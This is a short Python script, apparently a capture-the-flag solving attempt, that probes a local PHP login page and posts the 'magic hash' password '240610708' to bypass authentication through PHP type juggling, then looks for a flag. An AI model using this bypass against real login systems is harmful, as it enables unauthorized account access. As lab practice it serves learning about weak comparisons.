import urllib.request
import urllib.parse

target = "http://127.0.0.1:32907/index.php"

print("Testing with urllib\n")

try:
    # Test 1: Basic connectivity
    print("[+] Test 1: GET request")
    req = urllib.request.Request(target, method='GET')
    with urllib.request.urlopen(req, timeout=10) as response:
        data = response.read().decode('utf-8')
        print(f"Status: {response.status}")
        print(f"Length: {len(data)} bytes")
        print(f"Headers: {dict(response.headers)}")
    
    # Test 2: POST with type juggling
    print("\n[+] Test 2: POST with magic hash")
    post_data = urllib.parse.urlencode({'username': 'admin', 'password': '240610708'}).encode('utf-8')
    req = urllib.request.Request(target, data=post_data, method='POST')
    with urllib.request.urlopen(req, timeout=10) as response:
        data = response.read().decode('utf-8')
        print(f"Status: {response.status}")
        print(f"Length: {len(data)} bytes")
        
        if "FLAG{" in data:
            print("\n[!] FLAG FOUND:")
            print(data)
        else:
            print("No flag found")
            
except Exception as e:
    print(f"Error: {type(e).__name__}: {e}")
    import traceback
    traceback.print_exc()

